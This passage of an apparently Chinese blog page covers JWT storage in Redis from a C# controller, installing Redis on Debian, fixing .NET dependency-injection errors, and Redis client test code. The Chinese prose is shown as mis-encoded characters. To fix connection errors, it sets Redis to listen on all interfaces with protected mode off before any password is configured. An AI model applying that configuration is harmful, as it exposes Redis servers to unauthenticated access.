class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">YourController</span> : <span class="title">ControllerBase</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> JwtHelper _jwt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">YourController</span>(<span class="params">JwtHelper jwt</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        _jwt = jwt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºå¹¶å­˜å‚¨JWTåˆ°Redisçš„æ–¹æ³•</span></span><br><span class="line">    [<span class="meta">HttpPost</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">CreateAndStoreToken</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// å‡è®¾è¿™é‡Œä»è¯·æ±‚ä¸­è·å–åˆ°äº†usernameå’ŒuserIDç­‰ä¿¡æ¯ï¼Œç¤ºä¾‹ä¸­ç›´æ¥èµ‹å€¼</span></span><br><span class="line">        <span class="built_in">string</span> username = <span class="string">&quot;example_username&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> userID = <span class="string">&quot;12345&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> token = _jwt.CreateTokenIDAndStoreInRedis(username, userID);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Ok(<span class="keyword">new</span> &#123; token &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»Redisè¯»å–å¹¶è§£å¯†JWTè·å–ä¿¡æ¯çš„æ–¹æ³•</span></span><br><span class="line">    [<span class="meta">HttpGet</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">ReadTokenFromRedis</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// å‡è®¾è¿™é‡Œä»è¯·æ±‚ä¸­è·å–åˆ°äº†è¦è¯»å–çš„ç”¨æˆ·çš„uidï¼Œç¤ºä¾‹ä¸­ç›´æ¥èµ‹å€¼</span></span><br><span class="line">        <span class="built_in">string</span> uid = <span class="string">&quot;12345&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> JWToken = _jwt.ReadAndDecryptTokenFromRedis(uid);</span><br><span class="line">        <span class="built_in">string</span> tkuid = _jwt.GetUid(JWToken);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Ok(<span class="keyword">new</span> &#123; JWToken, tkuid &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">``` --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta"># debian redis setup</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta"># 1: æ›´æ–°è½¯ä»¶åŒ…åˆ—è¡¨</span></span><br><span class="line">é¦–å…ˆï¼Œç¡®ä¿çš„è½¯ä»¶åŒ…åˆ—è¡¨æ˜¯æœ€æ–°çš„ã€‚æ‰“å¼€ç»ˆç«¯å¹¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><h1 id="2-å®‰è£…Redis"><a href="#2-å®‰è£…Redis" class="headerlink" title="2: å®‰è£…Redis"></a>2: å®‰è£…Redis</h1><p>æ›´æ–°å®Œè½¯ä»¶åŒ…åˆ—è¡¨åï¼Œå¯ä»¥é€šè¿‡aptåŒ…ç®¡ç†å™¨æ¥å®‰è£…RedisæœåŠ¡å™¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install redis-server</span><br></pre></td></tr></table></figure><p>è¿™å°†å®‰è£…RedisåŠå…¶ä¾èµ–é¡¹ï¼Œå¹¶è‡ªåŠ¨å¯åŠ¨RedisæœåŠ¡ã€‚</p><h1 id="3-æ£€æŸ¥RedisçŠ¶æ€"><a href="#3-æ£€æŸ¥RedisçŠ¶æ€" class="headerlink" title="3: æ£€æŸ¥RedisçŠ¶æ€"></a>3: æ£€æŸ¥RedisçŠ¶æ€</h1><p>å®‰è£…å®Œæˆåï¼Œå¯ä»¥æ£€æŸ¥RedisæœåŠ¡æ˜¯å¦æ­£åœ¨è¿è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status redis-server</span><br></pre></td></tr></table></figure><p>å¦‚æœæœåŠ¡æ­£åœ¨è¿è¡Œï¼Œä¼šçœ‹åˆ°ç±»ä¼¼â€œactive (running)â€çš„çŠ¶æ€ä¿¡æ¯ã€‚</p><h1 id="4-é…ç½®Redis"><a href="#4-é…ç½®Redis" class="headerlink" title="4: é…ç½®Redis"></a>4: é…ç½®Redis</h1><p>Redisçš„é…ç½®æ–‡ä»¶ä½äº&#x2F;etc&#x2F;redis&#x2F;redis.confã€‚å¯èƒ½æƒ³è¦ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶æ¥æ›´æ”¹é»˜è®¤è®¾ç½®ï¼Œä¾‹å¦‚ç»‘å®šåœ°å€ã€ç«¯å£å·ã€è¦æ±‚å¯†ç ç­‰ã€‚ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€å®ƒï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/redis/redis.conf</span><br></pre></td></tr></table></figure><p>åšå‡ºå¿…è¦çš„æ›´æ”¹åä¿å­˜æ–‡ä»¶å¹¶é€€å‡ºç¼–è¾‘å™¨ã€‚</p><h1 id="5-é‡å¯RedisæœåŠ¡"><a href="#5-é‡å¯RedisæœåŠ¡" class="headerlink" title="5: é‡å¯RedisæœåŠ¡"></a>5: é‡å¯RedisæœåŠ¡</h1><p>å¦‚æœå¯¹é…ç½®æ–‡ä»¶åšäº†ä»»ä½•ä¿®æ”¹ï¼Œè®°å¾—é‡å¯RedisæœåŠ¡ä»¥ä½¿æ›´æ”¹ç”Ÿæ•ˆï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart redis-server</span><br></pre></td></tr></table></figure><h1 id="6-è®¾ç½®Rediså¼€æœºè‡ªå¯"><a href="#6-è®¾ç½®Rediså¼€æœºè‡ªå¯" class="headerlink" title="6: è®¾ç½®Rediså¼€æœºè‡ªå¯"></a>6: è®¾ç½®Rediså¼€æœºè‡ªå¯</h1><p>ä¸ºäº†ç¡®ä¿Redisåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨å¯åŠ¨ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ç”¨å¼€æœºè‡ªå¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> redis-server</span><br></pre></td></tr></table></figure><h1 id="7-æµ‹è¯•Rediså®‰è£…"><a href="#7-æµ‹è¯•Rediså®‰è£…" class="headerlink" title="7: æµ‹è¯•Rediså®‰è£…"></a>7: æµ‹è¯•Rediså®‰è£…</h1><p>å¯ä»¥é€šè¿‡è¿æ¥åˆ°æœ¬åœ°RedisæœåŠ¡å™¨æ¥æµ‹è¯•å®‰è£…æ˜¯å¦æˆåŠŸã€‚ä½¿ç”¨redis-cliå‘½ä»¤è¡Œå·¥å…·è¿æ¥åˆ°Redisï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli</span><br></pre></td></tr></table></figure><p>ä¸€æ—¦è¿›å…¥Redis CLIï¼Œå¯ä»¥å°è¯•è¿è¡Œpingå‘½ä»¤ï¼Œå¦‚æœRedisæœåŠ¡å™¨å“åº”PONGï¼Œåˆ™è¯´æ˜å®‰è£…å’Œé…ç½®éƒ½æ­£å¸¸å·¥ä½œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; ping</span><br><span class="line">PONG</span><br></pre></td></tr></table></figure><h2 id="Redis-é…ç½®æ–‡ä»¶"><a href="#Redis-é…ç½®æ–‡ä»¶" class="headerlink" title="Redis é…ç½®æ–‡ä»¶"></a>Redis é…ç½®æ–‡ä»¶</h2><p>ç¼–è¾‘ Redis çš„é…ç½®æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯ &#x2F;etc&#x2F;redis&#x2F;redis.confï¼‰ã€‚</p><p>ç¡®ä¿å…è®¸è¿œç¨‹è¿æ¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bind</span> 0.0.0.0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ï¼ˆé»˜è®¤ä»…å…è®¸æœ¬åœ°è¿æ¥ï¼Œ127.0.0.1ï¼‰ã€‚<br>ç¡®ä¿æœªè®¾ç½® protected-mode ä¸º yesï¼Œæˆ–è€…æ˜ç¡®é…ç½®æˆæƒè§„åˆ™ï¼š</p><p>protected-mode no<br>é‡å¯ Redis æœåŠ¡ä»¥åº”ç”¨æ›´æ”¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart redis</span><br></pre></td></tr></table></figure><h1 id="err"><a href="#err" class="headerlink" title="err"></a>err</h1><h2 id="500-Undocumented"><a href="#500-Undocumented" class="headerlink" title="500 Undocumented"></a>500 Undocumented</h2><p>Error: Internal Server Error<br>Response body<br>System.InvalidOperationException: Multiple constructors accepting all given argument types have been found in type â€˜userApiControllerâ€™. There should only be one applicable constructor.<br>   at Microsoft.Extensions.DependencyInjection.ActivatorUtilities.TryFindMatchingConstructor(Type instanceType, Type[] argumentTypes, ConstructorInfo&amp; matchingConstructor, Nullable<code>1[]&amp; parameterMap)    at Microsoft.Extensions.DependencyInjection.ActivatorUtilities.FindApplicableConstructor(Type instanceType, Type[] argumentTypes, ConstructorInfo&amp; matchingConstructor, Nullable</code>1[]&amp; matchingParameterMap)<br>   at Microsoft.Extensions.DependencyInjection.ActivatorUtilities.CreateFactoryInternal(Type instanceType, Type[] argumentTypes, ParameterExpression&amp; provider, ParameterExpression&amp; argumentArray, Expression&amp; factoryExpressionBody)</p><p>é—®é¢˜æ˜¯ç”±äºä¾èµ–æ³¨å…¥ç³»ç»Ÿåœ¨å®ä¾‹åŒ– userApiController æ—¶å‘ç°æœ‰å¤šä¸ªæ„é€ å‡½æ•°å¯ä»¥åŒ¹é…ä¼ é€’çš„å‚æ•°ï¼Œå› æ­¤æ— æ³•ç¡®å®šä½¿ç”¨å“ªä¸ªæ„é€ å‡½æ•°ã€‚è¿™ç§æƒ…å†µä¼šå¯¼è‡´ System.InvalidOperationException å¼‚å¸¸ã€‚å¤šä¸ªæ”¹æˆä¸€ä¸ªã€‚ </p><h2 id="System-InvalidOperationException-ã€"><a href="#System-InvalidOperationException-ã€" class="headerlink" title="System.InvalidOperationException: ã€"></a>System.InvalidOperationException: ã€</h2><p>Unable to resolve service for type â€˜JwtHelperâ€™ while attempting to activate â€˜userApiControllerâ€™.<br>   at Microsoft.Extensions.DependencyInjection.ActivatorUtilities.ThrowHelperUnableToResolveService(Type type, Type requiredBy)<br>   at lambda_method69(Closure, IServiceProvider, Object[])</p><p>è¿™ä¸ªé”™è¯¯è¡¨æ˜ wtHelper ç±»å‹æœªåœ¨ä¾èµ–æ³¨å…¥ (DI) å®¹å™¨ä¸­æ³¨å†Œï¼Œè€Œ IM.Controllers.userApiController éœ€è¦å®ƒä½œä¸ºä¾èµ–ã€‚DI ç³»ç»Ÿåœ¨å°è¯•è§£æ JwtHelper æ—¶å¤±è´¥ï¼Œå¯¼è‡´ Internal Server Errorã€‚</p><p><strong>æ£€æŸ¥ä¾èµ–æ³¨å†Œ</strong><br>ç¡®ä¿åœ¨ Program.cs æˆ– Startup.cs æ–‡ä»¶ä¸­æ³¨å†Œäº† JwtHelper æœåŠ¡ã€‚å¦‚æœ JwtHelper æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰å·¥å…·ç±»æˆ–æœåŠ¡ï¼Œä½ éœ€è¦å°†å®ƒæ·»åŠ åˆ° DI å®¹å™¨ä¸­ã€‚</p><p>builder.Services.AddScoped<JwtHelper>();<br>å¦‚æœ JwtHelper éœ€è¦æ„é€ å‡½æ•°æ³¨å…¥çš„ä¾èµ–é¡¹ï¼Œä¹Ÿè¦ç¡®ä¿è¿™äº›ä¾èµ–å·²æ³¨å†Œã€‚<br>å¦‚æœ JwtHelper æ˜¯æ— çŠ¶æ€çš„ï¼Œè€ƒè™‘ä½¿ç”¨ AddSingletonã€‚</p><h2 id="StackExchange-Redis-RedisConnectionException"><a href="#StackExchange-Redis-RedisConnectionException" class="headerlink" title="StackExchange.Redis.RedisConnectionException:"></a>StackExchange.Redis.RedisConnectionException:</h2><p>â€œIt was not possible to connect to the redis server(s). Error connecting right now. To allow this multiplexer to continue retrying until itâ€™s able to connect, use abortConnect&#x3D;false in your connection string or AbortOnConnectFail&#x3D;false; in your code.â€</p><p>æ£€æŸ¥ Redis çš„é…ç½®æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯ &#x2F;etc&#x2F;redis&#x2F;redis.confï¼‰ã€‚<br><strong>ç¡®ä¿å…è®¸è¿œç¨‹è¿æ¥</strong>ï¼š<br>bind 0.0.0.0<br> .Connect(â€œXXXX:6379,abortConnect&#x3D;falseâ€));</p><p>é‡å¯redis</p><h1 id="Redis-ä¿æŠ¤æ¨¡å¼"><a href="#Redis-ä¿æŠ¤æ¨¡å¼" class="headerlink" title="Redis ä¿æŠ¤æ¨¡å¼"></a>Redis ä¿æŠ¤æ¨¡å¼</h1><p>Redis å¤„äºä¿æŠ¤æ¨¡å¼ï¼Œé»˜è®¤æƒ…å†µä¸‹ç¦æ­¢å¤–éƒ¨è¿æ¥ã€‚</p><h2 id="è§£å†³æ–¹æ³•ï¼š"><a href="#è§£å†³æ–¹æ³•ï¼š" class="headerlink" title="è§£å†³æ–¹æ³•ï¼š"></a>è§£å†³æ–¹æ³•ï¼š</h2><p>ä¿®æ”¹ redis.conf ä¸­çš„ protected-mode è®¾ç½®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected-mode no</span><br></pre></td></tr></table></figure><p>é‡å¯ Redisï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart redis</span><br></pre></td></tr></table></figure><h1 id="ç¨‹åºæµ‹è¯•redis"><a href="#ç¨‹åºæµ‹è¯•redis" class="headerlink" title="ç¨‹åºæµ‹è¯•redis"></a>ç¨‹åºæµ‹è¯•redis</h1><p>.NET</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Redis æœåŠ¡å™¨åœ°å€å’Œç«¯å£</span></span><br><span class="line"><span class="built_in">string</span> redisConnectionString = <span class="string">&quot;199.24x.x.x:6379&quot;</span>; <span class="comment">// é»˜è®¤ Redis ç«¯å£æ˜¯ 6379</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºè¿æ¥åˆ° Redis çš„å®ä¾‹</span></span><br><span class="line">ConnectionMultiplexer redis = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    redis = ConnectionMultiplexer.Connect(redisConnectionString);</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;è¿æ¥æˆåŠŸ!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception ex)</span><br><span class="line">&#123;</span><br><span class="line">    Console.WriteLine(<span class="string">$&quot;è¿æ¥åˆ° Redis å¤±è´¥: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å– Redis æ•°æ®åº“å®ä¾‹</span></span><br><span class="line">IDatabase db = redis.GetDatabase();</span><br><span class="line"></span><br><span class="line"><span class="comment">// å†™å…¥æ•°æ®</span></span><br><span class="line"><span class="built_in">string</span> key = <span class="string">&quot;myKey22&quot;</span>;</span><br><span class="line"><span class="built_in">string</span> <span class="keyword">value</span> = <span class="string">&quot;Hello, Redis!&quot;</span>;</span><br><span class="line">db.StringSet(key, <span class="keyword">value</span>);</span><br><span class="line">Console.WriteLine(<span class="string">$&quot;å·²å†™å…¥: <span class="subst">&#123;key&#125;</span> - <span class="subst">&#123;<span class="keyword">value</span>&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯»å–æ•°æ®</span></span><br><span class="line"><span class="built_in">string</span> retrievedValue = db.StringGet(key);</span><br><span class="line">Console.WriteLine(<span class="string">$&quot;è¯»å–åˆ°: <span class="subst">&#123;key&#125;</span> - <span class="subst">&#123;retrievedValue&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ é™¤æ•°æ®</span></span><br><span class="line">db.KeyDelete(key);</span><br><span class="line">Console.WriteLine(<span class="string">$&quot;å·²åˆ é™¤: <span class="subst">&#123;key&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…³é—­è¿æ¥</span></span><br><span class="line">redis.Close();</span><br><span class="line">Console.WriteLine(<span class="string">&quot;è¿æ¥å…³é—­&quot;</span>);</span><br></pre></td></tr></table></figure><p>node</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i redis</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> redis = <span class="built_in">require</span>(<span class="string">&#x27;redis&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºRediså®¢æˆ·ç«¯è¿æ¥</span></span><br><span class="line"><span class="keyword">const</span> client = redis.<span class="title function_">createClient</span>(&#123;</span><br><span class="line">    <span class="attr">host</span>: <span class="string">&#x27;199.24x.x.x&#x27;</span>,</span><br><span class="line">    <span class="attr">port</span>: <span class="number">6379</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›‘å¬è¿æ¥äº‹ä»¶ï¼Œå½“æˆåŠŸè¿æ¥åˆ°Redisæ—¶æ‰§è¡Œå›è°ƒå‡½æ•°</span></span><br><span class="line">client.<span class="title function_">on</span>(<span class="string">&#x27;connect&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;æˆåŠŸè¿æ¥åˆ°RedisæœåŠ¡å™¨&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›‘å¬é”™è¯¯äº‹ä»¶ï¼Œå½“å‡ºç°é”™è¯¯æ—¶æ‰§è¡Œå›è°ƒå‡½æ•°</span></span><br><span class="line">client.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;è¿æ¥RedisæœåŠ¡å™¨æ—¶å‡ºç°é”™è¯¯ï¼š&#x27;</span>, err);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾ç½®ä¸€ä¸ªé”®å€¼å¯¹</span></span><br><span class="line">client.<span class="title function_">set</span>(<span class="string">&#x27;myKey&#x27;</span>, <span class="string">&#x27;myValue&#x27;</span>, <span class="function">(<span class="params">err, reply</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;è®¾ç½®é”®å€¼å¯¹æ—¶å‡ºç°é”™è¯¯ï¼š&#x27;</span>, err);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;è®¾ç½®é”®å€¼å¯¹æˆåŠŸï¼Œå›å¤ï¼š&#x27;</span>, reply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–é”®å€¼å¯¹</span></span><br><span class="line">client.<span class="title function_">get</span>(<span class="string">&#x27;myKey&#x27;</span>, <span class="function">(<span class="params">err, value</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;è·å–é”®å€¼å¯¹æ—¶å‡ºç°é”™è¯¯ï¼š&#x27;</span>, err);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;è·å–åˆ°çš„é”®å€¼å¯¹çš„å€¼ä¸ºï¼š&#x27;</span>, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ é™¤é”®å€¼å¯¹</span></span><br><span class="line">client.<span class="title function_">del</span>(<span class="string">&#x27;myKey&#x27;</span>, <span class="function">(<span class="params">err, reply</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;åˆ é™¤é”®å€¼å¯¹æ—¶å‡ºç°é”™è¯¯ï¼š&#x27;</span>, err);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;åˆ é™¤é”®å€¼å¯¹æˆåŠŸï¼Œå›å¤ï¼š&#x27;</span>, reply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…³é—­Rediså®¢æˆ·ç«¯è¿æ¥</span></span><br><span class="line">client.<span class="title function_">quit</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><h1 id="redisè®¾ç½®å¯†ç "><a href="#redisè®¾ç½®å¯†ç " class="headerlink" title="redisè®¾ç½®å¯†ç "></a>redisè®¾ç½®å¯†ç </h1><h2 id="1-ç¼–è¾‘-Redis-é…ç½®æ–‡ä»¶"><a href="#1-ç¼–è¾‘-Redis-é…ç½®æ–‡ä»¶" class="headerlink" title="1. ç¼–è¾‘ Redis é…ç½®æ–‡ä»¶"></a>1. ç¼–è¾‘ Redis é…ç½®æ–‡ä»¶</h2><p>Redis çš„é…ç½®æ–‡ä»¶é€šå¸¸ä½äº &#x2F;etc&#x2F;redis&#x2F;redis.conf æˆ– &#x2F;etc&#x2F;redis.confã€‚ç”¨ä½ å–œæ¬¢çš„æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€å®ƒï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/redis/redis.conf</span><br></pre></td></tr></table></figure><h2 id="2-æ‰¾åˆ°å¹¶ä¿®æ”¹-requirepass-å‚æ•°"><a href="#2-æ‰¾åˆ°å¹¶ä¿®æ”¹-requirepass-å‚æ•°" class="headerlink" title="2. æ‰¾åˆ°å¹¶ä¿®æ”¹ requirepass å‚æ•°"></a>2. æ‰¾åˆ°å¹¶ä¿®æ”¹ requirepass å‚æ•°</h2><p>åœ¨é…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°ä»¥ä¸‹è¡Œï¼ˆå¯èƒ½è¢«æ³¨é‡Šæ‰ï¼‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># requirepass foobared</span></span><br></pre></td></tr></table></figure><p>å°†å…¶å–æ¶ˆæ³¨é‡Šå¹¶æ›¿æ¢ä¸ºä½ çš„å¯†ç ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass your_secure_password</span><br></pre></td></tr></table></figure><h2 id="3-é‡å¯-Redis-æœåŠ¡"><a href="#3-é‡å¯-Redis-æœåŠ¡" class="headerlink" title="3. é‡å¯ Redis æœåŠ¡"></a>3. é‡å¯ Redis æœåŠ¡</h2><p>ä¿å­˜å¹¶é€€å‡ºæ–‡ä»¶åï¼Œé‡å¯ Redis æœåŠ¡ä»¥åº”ç”¨æ›´æ”¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart redis</span><br></pre></td></tr></table></figure><h2 id="4-æµ‹è¯•å¯†ç åŠŸèƒ½"><a href="#4-æµ‹è¯•å¯†ç åŠŸèƒ½" class="headerlink" title="4. æµ‹è¯•å¯†ç åŠŸèƒ½"></a>4. æµ‹è¯•å¯†ç åŠŸèƒ½</h2><p>ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æµ‹è¯• Redis æ˜¯å¦éœ€è¦å¯†ç ï¼š</p><p>ä½¿ç”¨ redis-cli è¿æ¥<br>å°è¯•æœªè¾“å…¥å¯†ç çš„å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli</span><br><span class="line">&gt; get key</span><br></pre></td></tr></table></figure><p>å¦‚æœè®¾ç½®äº†å¯†ç ï¼ŒRedis 